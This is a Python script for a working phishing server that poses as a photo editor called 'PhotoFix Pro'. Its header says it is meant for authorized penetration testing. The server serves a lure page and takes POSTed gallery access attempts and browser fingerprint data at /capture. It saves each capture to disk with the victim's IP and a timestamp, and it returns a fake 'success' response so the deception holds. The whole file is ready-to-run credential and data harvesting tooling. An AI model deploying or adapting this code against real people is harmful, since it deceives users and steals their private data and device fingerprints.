#!/usr/bin/env python3
"""
Photo Editor Phishing Server for Authorized Pentesting
Captures gallery access attempts and browser fingerprinting data
"""

import http.server
import socketserver
import json
import urllib.parse
import logging
from datetime import datetime
import os

PORT = 8080
DATA_DIR = "captured_data"
os.makedirs(DATA_DIR, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('phish_server.log'),
        logging.StreamHandler()
    ]
)

class PhishHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.path = '/index.html'
        
        # Log all requests
        client_ip = self.client_address[0]
        logging.info(f"GET {self.path} from {client_ip}")
        
        super().do_GET()
    
    def do_POST(self):
        if self.path == '/capture':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))
            
            # Add client IP and timestamp
            data['ip'] = self.client_address[0]
            data['timestamp'] = datetime.now().isoformat()
            
            # Save capture
            filename = f"{DATA_DIR}/capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(filename, 'w') as f:
                json.dump(data, f, indent=2)
            
            logging.info(f"🎣 CAPTURED from {self.client_address[0]}: {json.dumps(data)}")
            
            # Respond with success to maintain illusion
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"status":"success"}')
        else:
            super().do_POST()
    
    def log_message(self, format, *args):
        # Suppress default logging
        pass

if __name__ == "__main__":
    print(f"🚀 Starting PhotoFix Pro phishing server on http://0.0.0.0:{PORT}")
    print("📁 Captured data will be saved to ./captured_data/")
    print("📊 Server logs in phish_server.log")
    print("\n🎯 FOR AUTHORIZED PENTESTING ONLY")
    
    with socketserver.TCPServer(("", PORT), PhishHandler) as httpd:
        print(f"✅ Server running at http://localhost:{PORT}")
        print("Press Ctrl+C to stop")
        httpd.serve_forever()
